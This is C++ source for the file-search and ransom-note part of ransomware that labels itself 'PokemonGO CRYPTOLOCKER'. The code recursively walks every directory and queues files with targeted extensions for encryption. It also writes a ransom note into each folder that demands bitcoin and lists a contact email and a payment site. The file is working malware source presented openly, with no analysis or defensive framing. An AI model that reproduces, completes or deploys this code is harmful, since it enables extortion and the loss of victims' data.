/*
 * FileMan.cpp
 *
 * Recursive file search class
 * FileManager::
 *
 * COPYRIGHT (C) 2019 PokemonGO TEAM
 * pokemongo.icu
 */

#include "FileMan.h"
#include "../Cryptor/CryptExt.h"
#include <Windows.h>
#include <fstream>
#include <algorithm>
#include <shlobj.h>
#include <filesystem>
#include <iostream>

String FileManager::normalize_path(String path)
{
	std::replace(path.begin(), path.end(), '\\', '/');
	return path;
}

String FileManager::get_temp_folder()
{
	return std::filesystem::temp_directory_path().generic_wstring();
}


// GET USER HOME PATH
String FileManager::get_defined_path(const int csidl)
{
	WCHAR path[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPathW(NULL, csidl, NULL, 0, path))) {
		return normalize_path(path);
	}
	return nullptr;
}


String InfoFileName = L"/!INFO.CRYPTOPOKEMON.log";

/**
 * @FilePath Include file path
 */
void FileManager::create_info_file(String file_path)
{
	std::wofstream info_file(file_path);

	if (info_file)
	{
		info_file <<
			L"All files on your computer are encrypted. Files have the extension CRYPTOPOKEMON.\r\n" <<
			L"Do not try to decrypt the files yourself, this will only contribute to the loss of all your data on the computer.\r\n" <<
			L"To decrypt files, please transfer " << __BTCSUMM << L" BTC to " << __BTCWallet << L"\r\n" <<
			L"After you transfer money, write to email qaq94t64c45d3scd@openmailbox.org , saying this word \"" << __PCID << L"\".\r\n" <<
			L"\r\n\r\n" <<
			L"For advanced users:\r\n" <<
			L"After transferring money, go to http://cryptopokemon.top/ , and follow the instructions.\r\n" <<
			L"Your computer ID: " << __PCID << L"\r\n" <<
			L"To enter the site, use the browser.\r\n" <<
			L"COPYRIGHT (c)2019 PokemonGO CRYPTOLOCKER pokemongo.icu";

		info_file.close();
	}
}

// Recursive file search
void FileManager::recursive_search(String path)
{
	String InfoFilePathName = L"NONE";
	try
	{
		for (const auto & entry : std::filesystem::directory_iterator(path))
		{
			try
			{
				// Check directory is blacklist
				for (auto black_patch : BlackPatches)
				{
					if (black_patch == path)
					{
						return; // if current directory in blacklist, do not scan it
					}
				}

				if (std::filesystem::is_directory(entry))
				{
#ifndef _DEBUG
					if (!is_decrypt)
					{
						InfoFilePathName = entry.path().generic_wstring() + InfoFileName;
						create_info_file(InfoFilePathName);
					}
#endif
					recursive_search(entry.path().generic_wstring()); //Go to parent directory
				}
				else
				{

					if (is_decrypt)
					{
						if (entry.path().extension() == CRYPT_EXT)
						{
							queueFileNames.push(entry.path().generic_wstring());
						}
					}
					else
					{
						// check file extension (find extension in vector<String>)
						std::string fext = entry.path().extension().generic_string();
						std::transform(fext.begin(), fext.end(), fext.begin(), ::tolower);
						if (std::find(extensions_to_crypt.begin(), extensions_to_crypt.end(), fext) != extensions_to_crypt.end()
							&& InfoFilePathName != entry.path().generic_wstring())
						{
							queueFileNames.push(entry.path().generic_wstring());
						}
					}
				}
			}
			catch (...){}
		}
	}
	catch (...){}
}

std::vector<String> FileManager::show_drive_letters()
{
	const auto required_size = GetLogicalDriveStringsW(0, nullptr);

	std::vector<WCHAR> buffer(required_size + 1);
	const auto written_chars = GetLogicalDriveStringsW(required_size, buffer.data());

	if (written_chars > required_size)
	{
		//MSDN: If the buffer is not large enough, the return value is greater than nBufferLength.
	}

	if (written_chars == 0)
	{
		//handle error
	}

	const WCHAR* current_string = buffer.data();

	std::vector<String> drive_letters;

	while (*current_string != 0)
	{
		drive_letters.emplace_back(current_string);
		//pass currentString to other methods
		current_string += wcslen(current_string) + 1;
	}

	return drive_letters;
}